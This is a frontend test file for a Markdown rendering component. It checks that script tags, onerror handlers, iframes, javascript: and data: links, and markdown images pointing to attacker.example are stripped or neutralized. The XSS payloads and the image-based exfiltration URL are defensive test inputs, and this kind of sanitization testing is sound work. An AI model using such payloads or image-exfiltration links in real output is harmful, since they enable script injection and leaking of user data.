import { afterEach, describe, expect, it, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Markdown } from "@/components/ui/markdown";

function renderMd(source: string) {
  return render(<Markdown>{source}</Markdown>).container;
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("Markdown sanitization", () => {
  it("drops raw HTML: no script, iframe or event-handler element reaches the DOM", () => {
    const container = renderMd(
      [
        "Merhaba <script>window.__pwned = 1</script>",
        "",
        "<img src=x onerror=\"window.__pwned = 2\">",
        "",
        "<iframe src=\"https://evil.example\"></iframe>",
        "",
        "<b>kalın</b> metin",
      ].join("\n"),
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
    // Tags are dropped; an inline script's body may survive only as inert text.
    expect(container.innerHTML).not.toMatch(/<script|<iframe|onerror|<img/i);
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("never renders an image (exfiltration channel) -- only a text placeholder", () => {
    const container = renderMd(
      "Bak: ![gizli](https://attacker.example/?q=secret) ve [ref][r]\n\n![x][r]\n\n[r]: https://attacker.example/r.png",
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example/?q=secret");
    expect(screen.getByText("[görsel gösterilmedi: gizli]")).toBeInTheDocument();
  });

  it("neutralizes javascript: and data: links but keeps safe ones", () => {
    const container = renderMd(
      "[tıkla](javascript:alert(1)) [veri](data:text/html,<script>alert(1)</script>) [site](https://example.com)",
    );
    const links = [...container.querySelectorAll("a")];
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute("href", "https://example.com");
    expect(links[0]).toHaveAttribute("rel", "noopener noreferrer");
    expect(links[0]).toHaveAttribute("target", "_blank");
    expect(container.innerHTML).not.toMatch(/javascript:/i);
    expect(screen.getByText("tıkla")).toBeInTheDocument();
  });

  it("renders GFM (tables, task lists, strikethrough)", () => {
    const container = renderMd("| a | b |\n|---|---|\n| 1 | 2 |\n\n~~eski~~\n\n- [x] bitti");
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelector("del")).toHaveTextContent("eski");
    expect(container.querySelector('input[type="checkbox"]')).not.toBeNull();
  });

  it("is streaming-safe: an unclosed fence renders as code until it closes", () => {
    const partial = renderMd("Şöyle:\n\n```ts\nconst a = 1;\nconst b");
    expect(partial.querySelector("pre code")).toHaveTextContent("const a = 1; const b");
    expect(partial.querySelector("p")).toHaveTextContent("Şöyle:");

    const closed = renderMd("Şöyle:\n\n```ts\nconst a = 1;\n```\n\nSonra *metin*.");
    expect(closed.querySelectorAll("pre")).toHaveLength(1);
    expect(closed.querySelector("em")).toHaveTextContent("metin");
  });

  it("renders fenced code with a working copy button", async () => {
    const writeText = vi.fn(async () => undefined);
    const user = userEvent.setup();
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });

    const container = renderMd("```python\nprint('merhaba')\n```");
    expect(container.querySelector("pre code")).toHaveTextContent("print('merhaba')");

    await user.click(screen.getByRole("button", { name: "Kodu kopyala" }));
    expect(writeText).toHaveBeenCalledWith("print('merhaba')");
    expect(await screen.findByRole("button", { name: "Kopyalandı" })).toBeInTheDocument();
  });
});
